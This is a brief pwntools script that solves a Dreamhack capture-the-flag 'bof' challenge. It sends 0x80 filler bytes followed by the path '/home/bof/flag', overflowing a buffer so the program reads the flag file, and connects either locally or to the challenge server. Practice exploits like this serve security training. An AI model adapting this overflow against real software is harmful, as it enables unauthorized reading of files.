#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 8552
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./bof', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

pl = b'A'*0x80 + b"/home/bof/flag"
p.sendline(pl)
p.interactive()
